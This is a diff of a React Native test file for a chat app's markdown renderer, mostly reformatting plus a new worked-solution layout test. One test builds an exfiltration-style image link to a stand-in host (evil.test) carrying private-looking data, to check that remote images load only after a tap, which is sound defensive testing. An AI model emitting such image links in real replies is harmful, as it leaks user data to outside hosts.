@@ -4,7 +4,10 @@ import { fireEvent, render, within } from "@testing-library/react-native";
 import { MarkdownContent } from "@/components/MarkdownContent";
 import { makeRenderRules } from "@/components/markdown/markdownRenderRules";
 import { runRule } from "@/components/markdown/__tests__/support/runRule";
-import { makeMdStyles, PARAGRAPH_GAP } from "@/components/markdown/markdownContentStyles";
+import {
+  makeMdStyles,
+  PARAGRAPH_GAP,
+} from "@/components/markdown/markdownContentStyles";
 import { Space } from "@/lib/space";
 import { lightTheme } from "@/lib/theme";
 import { Type } from "@/lib/type";
@@ -14,7 +17,9 @@ import "@/lib/i18n";
 jest.unmock("react-i18next");
 
 jest.mock("@/components/LinkPreviewCard", () => {
-  const { Pressable, Text } = jest.requireActual("react-native") as typeof import("react-native");
+  const { Pressable, Text } = jest.requireActual(
+    "react-native",
+  ) as typeof import("react-native");
   return {
     LinkPreviewCard: ({ url }: { url: string }) => (
       <Pressable
@@ -135,8 +140,9 @@ describe("markdown render rules", () => {
       "> Courage is the most important of all the virtues, because without courage you can't practice any other virtue consistently. — Maya Angelou";
     const { getByText } = await render(<MarkdownContent content={md} />);
     const author = getByText("— Maya Angelou");
-    let node: { parent?: unknown; props?: { style?: StyleProp<TextStyle> } } | undefined =
-      author;
+    let node:
+      | { parent?: unknown; props?: { style?: StyleProp<TextStyle> } }
+      | undefined = author;
     let sawPrimaryAccent = false;
     while (node) {
       const flat = StyleSheet.flatten(node.props?.style);
@@ -168,9 +174,7 @@ describe("markdown render rules", () => {
 
   it("keeps a fraction verification tick attached before tall math", async () => {
     const { getByText, queryByText, toJSON } = await render(
-      <MarkdownContent
-        content={String.raw`$\frac{3}{4}=\frac{6}{8}$ ✓`}
-      />,
+      <MarkdownContent content={String.raw`$\frac{3}{4}=\frac{6}{8}$ ✓`} />,
     );
     const tick = getByText("✓");
     expect(StyleSheet.flatten(tick.props.style)).toMatchObject({
@@ -225,8 +229,9 @@ describe("markdown render rules", () => {
     const fills = new Set<string>();
     const painted = [lightTheme.surface, lightTheme.surfaceAlt];
     for (const label of ["Feature", "Addis Ababa"]) {
-      let node: { parent?: unknown; props?: { style?: StyleProp<TextStyle> } } | undefined =
-        getByText(label);
+      let node:
+        | { parent?: unknown; props?: { style?: StyleProp<TextStyle> } }
+        | undefined = getByText(label);
       while (node) {
         const flat = StyleSheet.flatten(node.props?.style);
         if (typeof flat?.backgroundColor === "string") {
@@ -246,7 +251,9 @@ describe("markdown render rules", () => {
     // the next line). The colon is a redundant "leads to" marker once the
     // next line follows — it must not render as a lone ":".
     const { queryByText } = await render(
-      <MarkdownContent content={String.raw`Use the product rule $\sqrt{ab}=\sqrt{a}\sqrt{b}$:`} />,
+      <MarkdownContent
+        content={String.raw`Use the product rule $\sqrt{ab}=\sqrt{a}\sqrt{b}$:`}
+      />,
     );
     expect(queryByText(/^:$/)).toBeNull();
   });
@@ -266,7 +273,9 @@ describe("markdown render rules", () => {
     const md = `- **Powers**
   - eight squared is 64
   - eight cubed is 512`;
-    const { getByText, queryByText } = await render(<MarkdownContent content={md} />);
+    const { getByText, queryByText } = await render(
+      <MarkdownContent content={md} />,
+    );
     expect(queryByText("1.")).toBeNull();
     expect(queryByText("2.")).toBeNull();
     expect(getByText(/eight squared is 64/)).toBeOnTheScreen();
@@ -278,7 +287,9 @@ describe("markdown render rules", () => {
   - Personalized
   - Task-focused
 - Pricing: Free`;
-    const { getByText, getAllByTestId } = await render(<MarkdownContent content={md} />);
+    const { getByText, getAllByTestId } = await render(
+      <MarkdownContent content={md} />,
+    );
     expect(getByText("Strengths")).toBeOnTheScreen();
     expect(getByText(/Personalized/)).toBeOnTheScreen();
     expect(getByText(/Pricing/)).toBeOnTheScreen();
@@ -288,8 +299,11 @@ describe("markdown render rules", () => {
   });
 
   it("renders a facebook fence as a post draft, not highlighted code", async () => {
-    const md = "```facebook\nHey everyone,\n\nJust wanted to share a quick update on my healing.\n```";
-    const { getByText, queryByText } = await render(<MarkdownContent content={md} />);
+    const md =
+      "```facebook\nHey everyone,\n\nJust wanted to share a quick update on my healing.\n```";
+    const { getByText, queryByText } = await render(
+      <MarkdownContent content={md} />,
+    );
     expect(queryByText(/^facebook:/)).toBeNull();
     expect(getByText(/Just wanted to share a quick update/)).toBeOnTheScreen();
     expect(getByText("Post draft · Facebook")).toBeOnTheScreen();
@@ -298,7 +312,9 @@ describe("markdown render rules", () => {
   it("does not number a flat top-level bullet list", async () => {
     const md = `- Even number
 - Composite number`;
-    const { queryByText, getByText } = await render(<MarkdownContent content={md} />);
+    const { queryByText, getByText } = await render(
+      <MarkdownContent content={md} />,
+    );
     expect(getByText(/Even number/)).toBeOnTheScreen();
     expect(queryByText("1.")).toBeNull();
     expect(queryByText("2.")).toBeNull();
@@ -318,7 +334,9 @@ describe("markdown render rules", () => {
 
   it("loads another host's image only after a tap, naming the host first", async () => {
     const exfil = "https://evil.test/p.png?d=dentist-tuesday";
-    const view = await render(<MarkdownContent content={`![status](${exfil})`} />);
+    const view = await render(
+      <MarkdownContent content={`![status](${exfil})`} />,
+    );
     expect(view.queryByRole("image")).toBeNull();
     const card = view.getByTestId("tap-to-load-image");
     expect(within(card).getByText("status")).toBeOnTheScreen();
@@ -373,10 +391,9 @@ describe("markdown render rules", () => {
       <MarkdownContent content={content} />,
     );
     expect(getAllByTestId("workout-section")).toHaveLength(2);
-    expect(getAllByTestId("workout-heading").map((node) => node.props.children)).toEqual([
-      "Given",
-      "Steps",
-    ]);
+    expect(
+      getAllByTestId("workout-heading").map((node) => node.props.children),
+    ).toEqual(["Given", "Steps"]);
     // A stacked fraction on the last line must not pull the lines into one row.
     expect(getAllByTestId("workout-line")).toHaveLength(3);
     expect(getAllByTestId("workout-note")).toHaveLength(2);
@@ -400,38 +417,51 @@ describe("markdown render rules", () => {
       "**Answer**  ",
       String.raw`$a = 4\ \text{m/s}^2$`,
     ].join("\n");
-    const { getAllByTestId, getByTestId, getByText, queryByTestId } = await render(
-      <MarkdownContent content={content} />,
-    );
+    const { getAllByTestId, getByTestId, getByText, queryByTestId } =
+      await render(<MarkdownContent content={content} />);
     // The headings stay at the margin. Given and Required sit behind a thin rule; the
     // working has none but starts at the same edge; the Answer's box needs neither.
-    const bodies = getAllByTestId("workout-body").map((body) => StyleSheet.flatten(body.props.style));
+    const bodies = getAllByTestId("workout-body").map((body) =>
+      StyleSheet.flatten(body.props.style),
+    );
     expect(bodies).toHaveLength(4);
     expect(bodies[0]).toMatchObject({ borderLeftWidth: 2 });
     expect(bodies[1]).toMatchObject({ borderLeftWidth: 2 });
     expect(bodies[2].borderLeftWidth).toBeUndefined();
     expect(bodies[2].paddingLeft).toBe((bodies[0].paddingLeft as number) + 2);
     expect(bodies[3].borderLeftWidth).toBeUndefined();
-    expect(StyleSheet.flatten(getByTestId("workout-answer").props.style)).toMatchObject({
+    expect(
+      StyleSheet.flatten(getByTestId("workout-answer").props.style),
+    ).toMatchObject({
       alignItems: "center",
     });
     // Each given is its own line, then the line naming them, in secondary ink.
     expect(queryByTestId("workout-given")).toBeNull();
-    const givenLines = within(getAllByTestId("workout-body")[0]).getAllByTestId("workout-line");
+    const givenLines = within(getAllByTestId("workout-body")[0]).getAllByTestId(
+      "workout-line",
+    );
     expect(givenLines).toHaveLength(3);
     const naming = getByText(/= force/);
-    expect(StyleSheet.flatten(naming.props.style)).toMatchObject({ color: lightTheme.textSecondary });
+    expect(StyleSheet.flatten(naming.props.style)).toMatchObject({
+      color: lightTheme.textSecondary,
+    });
     // Each name keeps its symbol and its meaning together: "where m = mass," then "F = force".
     const names = getAllByTestId("workout-naming");
     expect(names).toHaveLength(2);
-    expect(StyleSheet.flatten(names[0].props.style)).toMatchObject({ flexDirection: "row" });
+    expect(StyleSheet.flatten(names[0].props.style)).toMatchObject({
+      flexDirection: "row",
+    });
     expect(names[1]).toHaveTextContent(/F\s*= force/);
     // A move's note is pushed to the right edge.
     const note = getByTestId("workout-note");
-    expect(StyleSheet.flatten(note.props.style)).toMatchObject({ marginLeft: "auto" });
+    expect(StyleSheet.flatten(note.props.style)).toMatchObject({
+      marginLeft: "auto",
+    });
     expect(getByText(/second law/)).toBeOnTheScreen();
     // A written-out answer sits in its own box.
-    expect(within(getByTestId("workout-answer")).getAllByTestId("workout-line")).toHaveLength(1);
+    expect(
+      within(getByTestId("workout-answer")).getAllByTestId("workout-line"),
+    ).toHaveLength(1);
   });
 
   it("heads the formulas with the law's own name in a worked reply", async () => {
@@ -451,13 +481,12 @@ describe("markdown render rules", () => {
       "**Substitution**  ",
       String.raw`$a = \frac{27.7778}{8}$`,
     ].join("\n");
-    const { getAllByTestId } = await render(<MarkdownContent content={content} />);
-    expect(getAllByTestId("workout-heading").map((node) => node.props.children)).toEqual([
-      "Given",
-      "Required",
-      "Constant acceleration",
-      "Substitution",
-    ]);
+    const { getAllByTestId } = await render(
+      <MarkdownContent content={content} />,
+    );
+    expect(
+      getAllByTestId("workout-heading").map((node) => node.props.children),
+    ).toEqual(["Given", "Required", "Constant acceleration", "Substitution"]);
     // Laid out like Formula: one row per state, no rule. Solving for the unknown is a
     // step of its own between the law and its rearrangement, not a note beside it.
     const law = getAllByTestId("workout-body")[2]!;
@@ -468,14 +497,46 @@ describe("markdown render rules", () => {
     expect(StyleSheet.flatten(law.props.style).borderLeftWidth).toBeUndefined();
   });
 
-  it("rules an older reply's Find like Required", async () => {
-    const content = ["**Given**  ", "$d = 5$", "", "**Find**  ", "$t$"].join("\n");
-    const { getAllByTestId } = await render(<MarkdownContent content={content} />);
-    expect(getAllByTestId("workout-heading").map((node) => node.props.children)).toEqual([
+  it("heads the working with Solution, its formula by name", async () => {
+    const content = [
+      "**Given**  \n$d = 3000\\,\\mathrm{m}$",
+      "**Required**  \n$v$",
+      "**Solution**",
+      "**Average speed formula**  \n$v = \\frac{d}{t}$",
+      "**Substitution**  \n$v = \\frac{3000}{900}$",
+    ].join("\n\n");
+    const { getAllByTestId } = await render(
+      <MarkdownContent content={content} />,
+    );
+    expect(
+      getAllByTestId("workout-heading").map((node) => node.props.children),
+    ).toEqual([
       "Given",
-      "Find",
+      "Required",
+      "Solution",
+      "Average speed formula",
+      "Substitution",
     ]);
-    const bodies = getAllByTestId("workout-body").map((body) => StyleSheet.flatten(body.props.style));
+    // The formula's name is its heading, never a note beside it.
+    expect(getAllByTestId("workout-body")).toHaveLength(4);
+    expect(
+      within(getAllByTestId("workout-body")[2]!).queryByTestId("workout-note"),
+    ).toBeNull();
+  });
+
+  it("rules an older reply's Find like Required", async () => {
+    const content = ["**Given**  ", "$d = 5$", "", "**Find**  ", "$t$"].join(
+      "\n",
+    );
+    const { getAllByTestId } = await render(
+      <MarkdownContent content={content} />,
+    );
+    expect(
+      getAllByTestId("workout-heading").map((node) => node.props.children),
+    ).toEqual(["Given", "Find"]);
+    const bodies = getAllByTestId("workout-body").map((body) =>
+      StyleSheet.flatten(body.props.style),
+    );
     expect(bodies.map((body) => body.borderLeftWidth)).toEqual([2, 2]);
   });
 
@@ -490,12 +551,12 @@ describe("markdown render rules", () => {
       "**Substitution**  ",
       String.raw`$\tau = 70 \cdot 0.4 \cdot \sin(70^\circ)$`,
     ].join("\n");
-    const { getAllByTestId } = await render(<MarkdownContent content={content} />);
-    expect(getAllByTestId("workout-heading").map((node) => node.props.children)).toEqual([
-      "Given",
-      "Torque",
-      "Substitution",
-    ]);
+    const { getAllByTestId } = await render(
+      <MarkdownContent content={content} />,
+    );
+    expect(
+      getAllByTestId("workout-heading").map((node) => node.props.children),
+    ).toEqual(["Given", "Torque", "Substitution"]);
   });
 
   it("sets the parts of a question apart with a hairline, each with its own answer", async () => {
@@ -520,14 +581,26 @@ describe("markdown render rules", () => {
       String.raw`25\,\mathrm{m}`,
       "```",
     ].join("\n");
-    const { toJSON, getAllByTestId } = await render(<MarkdownContent content={content} />);
+    const { toJSON, getAllByTestId } = await render(
+      <MarkdownContent content={content} />,
+    );
     expect(getAllByTestId("workout-part")).toHaveLength(2);
-    type Node = { props?: { style?: StyleProp<TextStyle> }; children?: unknown[] | null };
+    type Node = {
+      props?: { style?: StyleProp<TextStyle> };
+      children?: unknown[] | null;
+    };
     const hairlines = (node: unknown): number => {
       if (!node || typeof node !== "object") return 0;
       const { props, children } = node as Node;
-      const own = StyleSheet.flatten(props?.style)?.height === StyleSheet.hairlineWidth;
-      return (own ? 1 : 0) + (children ?? []).reduce<number>((sum, child) => sum + hairlines(child), 0);
+      const own =
+        StyleSheet.flatten(props?.style)?.height === StyleSheet.hairlineWidth;
+      return (
+        (own ? 1 : 0) +
+        (children ?? []).reduce<number>(
+          (sum, child) => sum + hairlines(child),
+          0,
+        )
+      );
     };
     expect(hairlines(toJSON())).toBe(1);
   });
@@ -545,18 +618,22 @@ describe("markdown render rules", () => {
       String.raw`$a = \frac{27.78 - 0}{8}$`,
       String.raw`$a = 3.47\ \text{m/s}^2$`,
     ].join("\n");
-    const { getAllByTestId } = await render(<MarkdownContent content={content} />);
-    expect(getAllByTestId("workout-heading").map((node) => node.props.children)).toEqual([
-      "Given",
-      "Constant acceleration",
-      "Substitution",
-    ]);
-    expect(within(getAllByTestId("workout-body")[2]!).getAllByTestId("workout-line")).toHaveLength(2);
+    const { getAllByTestId } = await render(
+      <MarkdownContent content={content} />,
+    );
+    expect(
+      getAllByTestId("workout-heading").map((node) => node.props.children),
+    ).toEqual(["Given", "Constant acceleration", "Substitution"]);
+    expect(
+      within(getAllByTestId("workout-body")[2]!).getAllByTestId("workout-line"),
+    ).toHaveLength(2);
   });
 
   it("leaves a bold line over maths alone outside a worked reply", async () => {
     const content = ["**Constant acceleration**", "$v = u + at$"].join("\n");
-    const { queryAllByTestId } = await render(<MarkdownContent content={content} />);
+    const { queryAllByTestId } = await render(
+      <MarkdownContent content={content} />,
+    );
     expect(queryAllByTestId("workout-section")).toHaveLength(0);
   });
 
@@ -595,19 +672,28 @@ describe("markdown render rules", () => {
     ["**(a) Acceleration**", "a", "Acceleration"],
     ["**Part (b): Speed after 3 s**", "b", "Speed after 3 s"],
     ["**c) Distance in those 3 seconds**", "c", "Distance in those 3 seconds"],
-  ])("labels a part of a question in parts: %s", async (content, letter, title) => {
-    const { getByTestId } = await render(<MarkdownContent content={content} />);
-    const part = getByTestId("workout-part");
-    expect(within(part).getByText(letter)).toBeOnTheScreen();
-    expect(within(getByTestId("workout-part-title")).getByText(title)).toBeOnTheScreen();
-  });
+  ])(
+    "labels a part of a question in parts: %s",
+    async (content, letter, title) => {
+      const { getByTestId } = await render(
+        <MarkdownContent content={content} />,
+      );
+      const part = getByTestId("workout-part");
+      expect(within(part).getByText(letter)).toBeOnTheScreen();
+      expect(
+        within(getByTestId("workout-part-title")).getByText(title),
+      ).toBeOnTheScreen();
+    },
+  );
 
   it.each([
     "**Important**",
     "**(a) Acceleration** is the rate of change of velocity.",
     "**(z) Not a part letter**",
   ])("keeps any other bold line ordinary: %s", async (content) => {
-    const { queryByTestId } = await render(<MarkdownContent content={content} />);
+    const { queryByTestId } = await render(
+      <MarkdownContent content={content} />,
+    );
     expect(queryByTestId("workout-part")).toBeNull();
   });
 
@@ -667,7 +753,9 @@ describe("markdown render rules", () => {
     expect(getByTestId("lesson-step-formula")).toBeOnTheScreen();
     const fours = getAllByText("4");
     expect(
-      fours.some((node) => JSON.stringify(node.props.style).includes("SourceSans3-Bold")),
+      fours.some((node) =>
+        JSON.stringify(node.props.style).includes("SourceSans3-Bold"),
+      ),
     ).toBe(true);
   });
 
@@ -726,13 +814,15 @@ $\frac{d}{dx} x^{3} = 3 x^{2}$`}
     expect(getByRole("link", { name: "docs" })).toBeOnTheScreen();
   });
 
-  it.each([
-    "**1. Result** $x^2$",
-    "**1. Command** `pnpm test`",
-  ])("leaves non-lesson inline content in the markdown renderer: %s", async (content) => {
-    const { queryByTestId } = await render(<MarkdownContent content={content} />);
-    expect(queryByTestId("lesson-step")).toBeNull();
-  });
+  it.each(["**1. Result** $x^2$", "**1. Command** `pnpm test`"])(
+    "leaves non-lesson inline content in the markdown renderer: %s",
+    async (content) => {
+      const { queryByTestId } = await render(
+        <MarkdownContent content={content} />,
+      );
+      expect(queryByTestId("lesson-step")).toBeNull();
+    },
+  );
 
   it("renders a citation whose last line is — Name as a quote card", async () => {
     const { getByTestId, getByText } = await render(
@@ -745,7 +835,9 @@ $\frac{d}{dx} x^{3} = 3 x^{2}$`}
 
   it("renders a citation whose last line is -- Name as a quote card", async () => {
     const { getByTestId, getByText } = await render(
-      <MarkdownContent content={"> We are such stuff as dreams are made on.\n> -- Prospero"} />,
+      <MarkdownContent
+        content={"> We are such stuff as dreams are made on.\n> -- Prospero"}
+      />,
     );
     expect(getByTestId("quote-card")).toBeOnTheScreen();
     expect(getByText(/dreams are made on/)).toBeOnTheScreen();
@@ -753,13 +845,14 @@ $\frac{d}{dx} x^{3} = 3 x^{2}$`}
   });
 
   it("keeps a cited quote inside its numbered list item", async () => {
-    const { getAllByTestId, getByTestId, getByText, queryByTestId } = await render(
-      <MarkdownContent
-        content={
-          "1. First point\n\n   > Stay hungry, stay foolish.\n   > — Steve Jobs\n\n2. Second point"
-        }
-      />,
-    );
+    const { getAllByTestId, getByTestId, getByText, queryByTestId } =
+      await render(
+        <MarkdownContent
+          content={
+            "1. First point\n\n   > Stay hungry, stay foolish.\n   > — Steve Jobs\n\n2. Second point"
+          }
+        />,
+      );
     const card = within(getByTestId("quote-card"));
     expect(card.getByText("— Steve Jobs")).toBeOnTheScreen();
     expect(card.getByText(/Stay hungry/)).toBeOnTheScreen();
@@ -771,9 +864,13 @@ $\frac{d}{dx} x^{3} = 3 x^{2}$`}
 
   it("renders a Note inside a list item as a callout in that item", async () => {
     const { getByTestId, getByText, queryByTestId } = await render(
-      <MarkdownContent content={"1. First point\n   > Note: check the units\n2. Second point"} />,
+      <MarkdownContent
+        content={"1. First point\n   > Note: check the units\n2. Second point"}
+      />,
     );
-    expect(within(getByTestId("callout-note")).getByText(/check the units/)).toBeOnTheScreen();
+    expect(
+      within(getByTestId("callout-note")).getByText(/check the units/),
+    ).toBeOnTheScreen();
     expect(queryByTestId("indented-prose")).toBeNull();
     expect(getByText("Second point")).toBeOnTheScreen();
   });
@@ -781,22 +878,32 @@ $\frac{d}{dx} x^{3} = 3 x^{2}$`}
   it.each([
     ["an en dash", "> Stay hungry, stay foolish.\n> – Steve Jobs"],
     ["a hyphen", "> Stay hungry, stay foolish.\n> - Steve Jobs"],
-  ])("renders a quote closed by %s and a name as a quote card", async (_name, content) => {
-    const { getByTestId, queryByTestId } = await render(<MarkdownContent content={content} />);
-    const card = within(getByTestId("quote-card"));
-    expect(card.getByText("— Steve Jobs")).toBeOnTheScreen();
-    expect(queryByTestId("md-list-bullet")).toBeNull();
-  });
+  ])(
+    "renders a quote closed by %s and a name as a quote card",
+    async (_name, content) => {
+      const { getByTestId, queryByTestId } = await render(
+        <MarkdownContent content={content} />,
+      );
+      const card = within(getByTestId("quote-card"));
+      expect(card.getByText("— Steve Jobs")).toBeOnTheScreen();
+      expect(queryByTestId("md-list-bullet")).toBeNull();
+    },
+  );
 
   it.each([
     ["a bulleted list", "> Shopping:\n> - Eggs\n> - Milk"],
     ["an en dash list", "> Options:\n> – Fast\n> – Cheap"],
     ["a dialogue", "> — Are you coming?\n> — Yes."],
-  ])("keeps %s inside a quote as prose, not a quote card", async (_name, content) => {
-    const { getByTestId, queryByTestId } = await render(<MarkdownContent content={content} />);
-    expect(getByTestId("indented-prose")).toBeOnTheScreen();
-    expect(queryByTestId("quote-card")).toBeNull();
-  });
+  ])(
+    "keeps %s inside a quote as prose, not a quote card",
+    async (_name, content) => {
+      const { getByTestId, queryByTestId } = await render(
+        <MarkdownContent content={content} />,
+      );
+      expect(getByTestId("indented-prose")).toBeOnTheScreen();
+      expect(queryByTestId("quote-card")).toBeNull();
+    },
+  );
 
   it("renders a hint blockquote as indented prose, not a quote card", async () => {
     const { getByTestId, getByText, queryByTestId, toJSON } = await render(
@@ -843,8 +950,14 @@ $\frac{d}{dx} x^{3} = 3 x^{2}$`}
 
 describe("emphasis faces", () => {
   // A one-file family has no italic or bold slot: the face must be the file.
-  function faceOf(node: { props: { style?: StyleProp<TextStyle> }; parent: unknown }): string | undefined {
-    let current: { props: { style?: StyleProp<TextStyle> }; parent: unknown } | null = node;
+  function faceOf(node: {
+    props: { style?: StyleProp<TextStyle> };
+    parent: unknown;
+  }): string | undefined {
+    let current: {
+      props: { style?: StyleProp<TextStyle> };
+      parent: unknown;
+    } | null = node;
     while (current) {
       const family = StyleSheet.flatten(current.props.style)?.fontFamily;
       if (family) return family;
@@ -854,14 +967,18 @@ describe("emphasis faces", () => {
   }
 
   it("draws *italic* with the italic file, never fontStyle", async () => {
-    const { getByText } = await render(<MarkdownContent content="A *soft* word" />);
+    const { getByText } = await render(
+      <MarkdownContent content="A *soft* word" />,
+    );
     const leaf = getByText("soft");
     expect(faceOf(leaf)).toBe("SourceSans3-Italic");
     expect(StyleSheet.flatten(leaf.props.style)?.fontStyle).not.toBe("italic");
   });
 
   it("draws ***both*** with the bold italic file", async () => {
-    const { getByText } = await render(<MarkdownContent content="A ***loud*** word" />);
+    const { getByText } = await render(
+      <MarkdownContent content="A ***loud*** word" />,
+    );
     expect(faceOf(getByText("loud"))).toBe("SourceSans3-BoldItalic");
   });
 
@@ -875,28 +992,38 @@ describe("emphasis faces", () => {
 
 describe("reply rhythm", () => {
   it("drops the top margin of a heading that opens the reply", async () => {
-    const { toJSON } = await render(<MarkdownContent content={"# Title\n\nBody text"} />);
+    const { toJSON } = await render(
+      <MarkdownContent content={"# Title\n\nBody text"} />,
+    );
     const tree = toJSON() as { props: { style?: StyleProp<TextStyle> } } | null;
     const top = StyleSheet.flatten(tree?.props.style)?.marginTop;
-    const heading = StyleSheet.flatten(makeMdStyles(lightTheme).heading1)?.marginTop;
+    const heading = StyleSheet.flatten(
+      makeMdStyles(lightTheme).heading1,
+    )?.marginTop;
     expect(heading).toBeGreaterThan(0);
     expect(top).toBe(-(heading as number));
   });
 
   it("leaves a reply that opens with text where it is", async () => {
-    const { toJSON } = await render(<MarkdownContent content={"Body text\n\n# Later"} />);
+    const { toJSON } = await render(
+      <MarkdownContent content={"Body text\n\n# Later"} />,
+    );
     const tree = toJSON() as { props: { style?: StyleProp<TextStyle> } } | null;
     expect(StyleSheet.flatten(tree?.props.style)?.marginTop).toBeUndefined();
   });
 
   it("sizes inline code to the heading it sits in", async () => {
-    const { getByText } = await render(<MarkdownContent content={"## Use `map` here"} />);
+    const { getByText } = await render(
+      <MarkdownContent content={"## Use `map` here"} />,
+    );
     const size = StyleSheet.flatten(getByText("map").props.style)?.fontSize;
     expect(size).toBeGreaterThan(14);
   });
 
   it("draws a rule beside an ordinary blockquote", async () => {
-    const { getByTestId } = await render(<MarkdownContent content={"> just an aside"} />);
+    const { getByTestId } = await render(
+      <MarkdownContent content={"> just an aside"} />,
+    );
     const style = StyleSheet.flatten(getByTestId("indented-prose").props.style);
     expect(style.borderLeftWidth).toBeGreaterThan(0);
     expect(style.marginTop).toBe(0);
@@ -905,7 +1032,9 @@ describe("reply rhythm", () => {
   it("draws an ordinary blockquote with a visible rule and secondary ink at body size", async () => {
     const { getByTestId, getByText } = await render(
       <MarkdownContent
-        content={"> An aside with **weight**, `code` and [a link](https://example.com)"}
+        content={
+          "> An aside with **weight**, `code` and [a link](https://example.com)"
+        }
       />,
     );
     const rule = StyleSheet.flatten(getByTestId("indented-prose").props.style);
@@ -921,7 +1050,9 @@ describe("reply rhythm", () => {
       lightTheme.textSecondary,
     );
     // A link keeps its own color inside the quote.
-    expect(StyleSheet.flatten(getByText("a link").props.style).color).toBe(lightTheme.primary);
+    expect(StyleSheet.flatten(getByText("a link").props.style).color).toBe(
+      lightTheme.primary,
+    );
   });
 
   it("outlines a quote card with a visible border and keeps its quote in body ink", async () => {
@@ -931,9 +1062,9 @@ describe("reply rhythm", () => {
     const card = StyleSheet.flatten(getByTestId("quote-card").props.style);
     expect(card.borderWidth).toBe(1);
     expect(card.borderColor).toBe(lightTheme.border);
-    expect(StyleSheet.flatten(getByText("To be or not to be.").props.style).color).toBe(
-      lightTheme.assistantText,
-    );
+    expect(
+      StyleSheet.flatten(getByText("To be or not to be.").props.style).color,
+    ).toBe(lightTheme.assistantText);
   });
 });
 
@@ -950,15 +1081,21 @@ describe("list rhythm", () => {
       <MarkdownContent content={"- one\n- two\n- three\n\nAfter."} />,
     );
     const bullets = getAllByTestId("md-list-bullet");
-    expect(bullets.map((bullet) => itemGap(bullet))).toEqual([Space.xs, Space.xs, 0]);
+    expect(bullets.map((bullet) => itemGap(bullet))).toEqual([
+      Space.xs,
+      Space.xs,
+      0,
+    ]);
     const list = bullets[0].parent as Host;
-    expect(StyleSheet.flatten((list.parent as Host).props.style)?.marginBottom).toBe(
-      PARAGRAPH_GAP,
-    );
+    expect(
+      StyleSheet.flatten((list.parent as Host).props.style)?.marginBottom,
+    ).toBe(PARAGRAPH_GAP);
   });
 
   it("ends a numbered list the same way", async () => {
-    const { getByText } = await render(<MarkdownContent content={"1. one\n2. two\n3. three"} />);
+    const { getByText } = await render(
+      <MarkdownContent content={"1. one\n2. two\n3. three"} />,
+    );
     expect(["1.", "2.", "3."].map((n) => itemGap(getByText(n)))).toEqual([
       Space.xs,
       Space.xs,
@@ -968,7 +1105,9 @@ describe("list rhythm", () => {
 
   it("ends a nested list flush so its parent item's gap separates it", async () => {
     const { getAllByTestId, getByTestId } = await render(
-      <MarkdownContent content={"- Parent\n  - child a\n  - child b\n- Last"} />,
+      <MarkdownContent
+        content={"- Parent\n  - child a\n  - child b\n- Last"}
+      />,
     );
     // child a, child b (nested), then Last.
     expect(getAllByTestId("md-list-bullet").map((b) => itemGap(b))).toEqual([
